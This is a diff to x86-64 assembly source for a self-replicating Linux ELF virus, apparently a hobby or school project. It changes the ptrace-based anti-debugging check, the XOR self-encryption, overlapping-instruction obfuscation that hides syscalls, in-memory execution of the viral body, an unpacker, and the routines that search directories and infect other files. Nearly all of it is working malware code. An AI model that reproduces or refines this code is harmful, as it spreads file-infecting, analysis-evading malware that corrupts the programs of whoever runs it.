@@ -50,7 +50,7 @@ _h3ll0w0rld:
 
 	; Overlapping instruction:
 	; http://infoscience.epfl.ch/record/167546/files/thesis.pdf
-	call _check_if_traced
+	call _4m_1_tr4c3d
 
 	cmp rax, 0x0
 	jz .sneakyboi - 2; has to jmp on [48 31 c0] -> xor rax, rax
@@ -58,8 +58,8 @@ _h3ll0w0rld:
 	.code: ; so it's crypted right ? EVERYTHING IS KEEEYYY
 		push rdx
 		lea rdi, [rel _start]
-		sub rdi, [rel entry_inject]
 		mov rsi, [rel entry_inject]
+		sub rdi, rsi
 		sub rsi, 8 * 3
 		add rsi, [rel length]
 		push 0x7
@@ -74,7 +74,7 @@ _h3ll0w0rld:
 		sub rdx, rsi
 		mov rsi, [rel length]
 		sub rsi, rdx ; length - (_virus - _params)
-		lea rdx, [rel _check_if_traced]
+		lea rdx, [rel _h3ll0w0rld]
 		mov rcx, KEY_SIZE
 		call _xor_encrypt
 		pop rdx
@@ -83,12 +83,11 @@ _h3ll0w0rld:
 	.happy_mix:
 	push 2
 	pop rdi
-	lea rsi, [rel .gandalf + 2]
+	lea rsi, [rel debugging]
 	jmp $+6
 	mov rax, 0x58016a5a0c6a3713; push 12; pop rdx; push 1; pop rax
 	syscall
 
-	; Wtf am I doing with my life
 	jmp $+4; has to skip 2 byte of instruction next line
 	mov rdi, 0x03eb583c6a5f016a; push 1; pop rdi; push 60; pop rax; jmp $+5
 	;                            from right to left
@@ -107,16 +106,15 @@ _h3ll0w0rld:
 	cmp rax, 0x0
 	jnz _exit
 
+	; host part
 	push r14
 	call _make_virus_map
-	; host part
 	call _search_dir
 	call _munmap_virus
 	pop r14
-	jmp _exit
 
+	jmp _exit
 	.infected:
-		; --- END OF HELL
 		push SYSCALL_FORK
 		pop rax; fork
 		syscall
@@ -125,17 +123,10 @@ _h3ll0w0rld:
 		jz _virus
 
 		jmp _prg
+	debugging db `DEBUGGING..\n`, 0x0
 
-		.gandalf:; 2 byte then [debug_msg db `DEBUGGING..\n`, 0x0]
-			mov rax, 0x4e49474755424544
-			db `G..\n`, 0x0
-
-_check_if_traced:
-	push rdi
-	push rsi
-	push rcx
+_4m_1_tr4c3d:
 	push rdx
-	push r8
 
 	push SYSCALL_GETPID; getpid
 	pop rax
@@ -143,14 +134,13 @@ _check_if_traced:
 
 	push PR_SET_PTRACER
 	pop rdi
-	push rax
+	push rax; pid
 	pop rsi
-	xor rdx, rdx
-	xor rcx, rcx
-	xor r8, r8
 	push SYSCALL_PRCTL; prctl
 	pop rax
 	syscall
+
+	xor rdx, rdx
 
 	push SYSCALL_FORK
 	pop rax; fork
@@ -164,11 +154,10 @@ _check_if_traced:
 		pop rax
 		syscall
 		push rax
-		pop r8
+		pop rsi; ppid
 
 		push PTRACE_ATTACH
 		pop rdi
-		mov rsi, r8; ppid
 		push SYSCALL_PTRACE; ptrace
 		pop rax
 		syscall
@@ -176,7 +165,7 @@ _check_if_traced:
 		cmp rax, 0x0
 		jne .traced
 
-		push r8
+		push rsi
 		pop rdi
 		xor rsi, rsi
 		push SYSCALL_WAIT4; wait4
@@ -184,7 +173,6 @@ _check_if_traced:
 		syscall
 
 		xor rdi, rdi
-
 		jmp .exit
 		.traced:
 			push 1
@@ -207,11 +195,7 @@ _check_if_traced:
 		WEXITSTATUS rax, qword [rsp - 8]
 		add rsp, 8
 
-	pop r8
 	pop rdx
-	pop rcx
-	pop rsi
-	pop rdi
 ret
 
 ;                      v dst       v len      v key       v key_size
@@ -248,7 +232,6 @@ _virus:
 	push rdx
 	push r8
 	push r9
-	push r14
 
 	; copy the virus into a mmap executable
 	xor rdi, rdi; NULL
@@ -292,7 +275,6 @@ _virus:
 	pop rdi
 	pop rsi
 
-	pop r14
 	pop r9
 	pop r8
 
@@ -304,9 +286,11 @@ _virus:
 	add rax, rdi
 
 	push rdi ; save addr
+	push r14
 	mov r14, [rel length]
 
 	call rax ; jump to mmaped memory
+	pop r14
 
 	pop rdi ; pop addr
 	pop rsi ; pop length
@@ -362,10 +346,12 @@ _unpack:; (void *rdi, void *rsi, size_t rdx)
 			mov rdi, r9
 			add rdi, r8
 			mov al, [r10 + rcx + 1]
-			mov rsi, rdi
+			push rdi
+			pop rsi
 			sub rsi, rax
 			mov al, [r10 + rcx + 2]
-			mov rdx, rax
+			push rax
+			pop rdx
 			call _ft_memcpy
 			xor rax, rax
 			mov al, byte[r10 + rcx + 2]
@@ -407,6 +393,9 @@ ret
 
 ; packer-part till _eof --------------------------------------------------------
 _pack_start:
+; = DEBUG
+; db `test`, 0x0
+; =
 _search_dir:
 %ifdef FSOCIETY
 	push SYSCALL_GETEUID; geteuid
@@ -804,7 +793,7 @@ _infect_file: ; (string rdi, stat rsi)
 			mov rsi, rdx; [rel length]
 			push rdx
 			sub rsi, rcx ; length - (_virus - _params)
-			lea rdx, [rel _check_if_traced]
+			lea rdx, [rel _h3ll0w0rld]
 			mov rcx, KEY_SIZE
 			call _xor_encrypt
 			pop rdx
